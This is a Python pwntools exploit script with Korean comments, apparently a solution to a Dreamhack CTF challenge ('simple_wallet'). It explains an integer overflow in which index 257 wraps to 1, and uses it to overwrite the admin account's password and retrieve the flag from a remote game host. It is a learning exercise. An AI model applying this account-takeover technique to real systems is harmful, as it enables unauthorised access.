from pwn import *

# 풀이
# 1. 취약점 발생 지점
#     1) 대상 기능 : 계정 패스워드 변경
#     2) .text 영역 offset 0x1647 ~ 0x164E 위치 - call sub_1280 / test al, al
#         => 1바이트 공간에 4바이트 크기의 데이터가 들어가면 정수 오버플로우 발생 가능
#         => sub_1280 함수의 반환값이 4바이트 크기의 unsigned int
#     3) .text 영역 offset 0x1655 위치 - movzx ebx, al
#         => 정수 오버플로우로 변조된 데이터가 저장되는 시점
#     4) .text 영역 offset 0x1687 ~ 0x168E - lea rax, 0x40A0 (패스워드 저장장소) / mov r12, [rax+rbx*8]
#         => 오버플로우되어 변경된 idx 위치에 해당하는 계정의 패스워드를 저장하도록 오동작하는 위치
# 2. 공격 방식
#     1) 공격 대상은 인덱스 번호 1번인 admin 계정
#     2) unsigned byte의 최대 크기는 255이므로 인덱스 번호가 257인 계정을 만들어 오버플로우시 257을 향하도록 사전 준비
#     3) 계정 생성 후 3번 항목에 접근하여 257 계정의 패스워드를 변조할 패스워드로 변경
#         => 하지만 실제로는 정수 오버플로우의 영향으로 257 -> 1로 바뀌면서 admin의 패스워드 변경
#     4) show balance (2번) 기능으로 접근하여 admin 계정의 인덱스 번호인 1번의 계정에 로그인
#     5) 로그인 결과 플래그 획득

# Local
#r = process('./simple_wallet')

# Remote
r = remote('host1.dreamhack.games', 19467)

ADMIN_IDX = b'1'
USER_IDX = b'257'
PW = b'1111'

sleep(1)

r.recvuntil(b'Enter number: ')
r.sendline(b'1')

r.recvuntil(b'idx: ')
r.sendline(USER_IDX)

r.recvuntil(b'Password : ')
r.sendline(PW)

sleep(1)

r.recvuntil(b'Enter number: ')
r.sendline(b'3')

r.recvuntil(b'idx: ')
r.sendline(USER_IDX)

r.recvuntil(b'Password : ')
r.sendline(PW)

r.recvuntil(b'New Password : ')
r.sendline(PW)

sleep(1)

r.recvuntil(b'Enter number: ')
r.sendline(b'2')

r.recvuntil(b'idx: ')
r.sendline(ADMIN_IDX)

r.recvuntil(b'Password : ')
r.sendline(PW)

r.recvuntil(b'CORRECT PASSWORD\n\n')

FLAG = r.recvuntil(b'\n', drop=True).decode('utf-8')

print(f"FLAG : {FLAG}")